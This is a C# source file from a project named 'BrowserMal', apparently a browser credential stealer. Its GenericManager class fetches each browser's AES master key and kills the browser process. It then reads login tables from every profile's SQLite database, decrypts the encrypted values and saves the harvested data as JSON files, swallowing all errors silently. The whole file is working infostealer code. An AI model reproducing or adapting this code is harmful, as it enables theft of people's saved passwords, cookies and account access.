﻿using BrowserMal.AES;
using BrowserMal.Browser;
using BrowserMal.Filesaver;
using BrowserMal.Util;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using BrowserMal.SQLite;

namespace BrowserMal.Manager
{
    public class GenericManager<T>
    {
        private readonly string tableName;
        private readonly string[] columnNames;
        private readonly bool lastArgEncrypted;

        public GenericManager(string tableName, string[] columnNames, bool lastArgEncrypted)
        {
            this.tableName = tableName;
            this.columnNames = columnNames;
            this.lastArgEncrypted = lastArgEncrypted;
        }

        public void Init(ref List<BrowserModel> browsers, string profileType)
        {
            try
            {
                foreach (BrowserModel browser in browsers)
                {
                    if (!Directory.Exists(browser.Location))
                        continue;

                    byte[] key = AesGcm256.GetMasterKey(browser.Location);

                    if (key == null)
                        continue;

                    browser.MasterKey = key;
                    ProcessUtil.KillProcess(browser.ProcessName);

                    List<T> result = GetLogins(browser.Location, browser.MasterKey, profileType);

                    if (result.Count == 0)
                        continue;

                    FileManager.Save<T>(result, $"{browser.Name}_{tableName}.json");
                }
            }
            catch { }
        }

        private List<T> GetLogins(string path, byte[] masterKey, string profileType)
        {
            List<string> profiles = Browser.Util.GetAllProfiles(path, profileType);
            List<T> creds = new List<T>();

            foreach (string profile in profiles)
            {
                if (!File.Exists(profile))
                    continue;

                creds.AddRange(GetProfileLogins(profile, masterKey));
            }

            return creds;
        }

        private T CreateInstanceOfType(object[] args) => (T)Activator.CreateInstance(typeof(T), args);

        private List<T> GetProfileLogins(string path, byte[] masterKey)
        {
            List<T> generic = new List<T>();

            SqliteHandler sqLiteHandler = new SqliteHandler(path);
            sqLiteHandler.ReadTable(tableName);

            for (int i = 0; i <= sqLiteHandler.GetRowCount() - 1; i++)
            {
                try
                {
                    string[] values = GrabSqliteValues(columnNames, ref sqLiteHandler, i, masterKey);

                    if (string.IsNullOrEmpty(values.Last()) && lastArgEncrypted)
                        continue;

                    T obj = CreateInstanceOfType(values);
                    generic.Add(obj);
                 
                }
                catch { }
            }

            return generic;
        }

        private string[] GrabSqliteValues(string[] columns, ref SqliteHandler sqLiteHandler, int row, byte[] masterKey)
        {
            string[] values = new string[columns.Length];

            for (int i = 0; i < columns.Length; i++)
            {
                // last value
                if (i == columnNames.Length - 1 && lastArgEncrypted)
                {
                    values[i] = AesGcm256.GetEncryptedValue(sqLiteHandler.GetValue(row, columns[i]), masterKey);
                    break;
                }

                values[i] = sqLiteHandler.GetValue(row, columns[i]);
            }

            return values;
        }
    }
}
